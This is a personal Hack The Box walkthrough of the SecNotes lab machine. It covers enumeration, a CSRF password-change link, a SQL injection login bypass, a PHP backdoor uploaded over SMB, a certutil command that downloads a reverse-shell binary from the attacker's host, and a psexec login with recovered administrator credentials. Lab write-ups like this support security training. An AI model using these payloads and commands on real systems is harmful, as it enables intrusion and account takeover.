<img src="Pasted image 20240722183644.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping**
![[Pasted image 20240703174014.png]]

**Nmap Scans**
```
mapit 10.10.10.97
```

Nmap Default Scan
![[Pasted image 20240703174105.png]]

Nmap Service and Script Scan
![[Pasted image 20240703174402.png]]
![[Pasted image 20240703174414.png]]

Nmap All port Scan
![[Pasted image 20240703174710.png]]

Nmap Service and Script Scan for new port
![[Pasted image 20240703175831.png]]

On Port 80
![[Pasted image 20240703174135.png]]
tried with default admin passwords, but it say's the is no account name admin

So registered new user test with password test@1234 and logged in
![[Pasted image 20240703174332.png]]

No smb Session
![[Pasted image 20240703175234.png]]

Gobuster Scan
```
gobuster dir -u http://10.10.10.97 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240703175324.png]]Nothing Intresting

Something Intresting in the contact us area
![[Pasted image 20240703181012.png]]
Tyler is clicking whatever link we send to him

![[Pasted image 20240703181047.png]]

So will trick him to change password, by sending malicious link
For that we need to capture the request response of the change password functionality
![[Pasted image 20240703181740.png]]

![[Pasted image 20240703181721.png]]

Will send him this corrupted link, I have added my address, just to make sure is he click the link accordingly.
```
http://10.10.10.97/change_pass.php?password=rosh@3000&confirm_password=rosh@3000&submit=submit
http://10.10.14.3:8080
```
![[Pasted image 20240703182655.png]]
I think he clicked the link accordingly, now will check the password has been changed or not

But it didn't work, I don't Know the reason, Though I have checked walkthroughs and official writeup, for some unknown reason, it didn't work for me. But I found other way to exploit this from this link: https://www.hackingarticles.in/hack-the-box-secnotes-walkthrough/

Will use this ' or 1='1  to  create the account and logged in with the same **' or 1='1:' or 1='1**
Can get into tyler's account
![[Pasted image 20240703184813.png]]

Will analyse the notes
![[Pasted image 20240703184835.png]]
Found tyler's password **92g!mA8BGjOirkL%OG*&**

We can only try this password in one place, it is smb
```
smbclient -U 'tyler' -L //10.10.10.97
```
![[Pasted image 20240703185113.png]]
Now we can list the shares, will analyze the new-site

SMB session
```
smbclient \\\\10.10.10.97\\new-site\\ -U tyler
```
![[Pasted image 20240703185831.png]]

Surly it should the IIS service on port 8808
will put a cmdasp.aspx to ger RCE
It doesn't work, tried with bot .aspx and asp

Will try with simple-backdoor.php
![[Pasted image 20240703190403.png]]
![[Pasted image 20240703190347.png]]

Will Jump to Initial Foothold.....!

Now will get Reverse Shell
```
ertutil -urlcache -f http://10.10.14.3/rev.exe rev.exe
```
![[Pasted image 20240703191143.png]]

Will trigger that
![[Pasted image 20240703191220.png]]

Will trigger that
```
C:\inetpub\new-site\rev.exe
```
![[Pasted image 20240703191310.png]]

I have already started my netcat listener 
Got shell
![[Pasted image 20240703191349.png]]

**User.txt**
![[Pasted image 20240703191629.png]]



Found some files
```
Get-ChildItem -Path C:\Users -Include *.txt, *.log, *.kdbx, *.conf, *.ini, *.exe, *.ps1 -File -Recurse -ErrorAction SilentlyContinue
```
![[Pasted image 20240703191757.png]]

Will check our Privilege
```
whoami /priv
```
![[Pasted image 20240703191857.png]]

Will analyse this bash.lnk
![[Pasted image 20240703192400.png]]

Nothing works for me in this lab, so found admin's password and got session via psexec
```
psexec.py "administrator:u6\!4ZwgwOM#^OBf#Nwnh"@10.10.10.97 cmd.exe
```
![[Pasted image 20240703194103.png]]

Root.txt
![[Pasted image 20240703194219.png]]




Not yet.......! 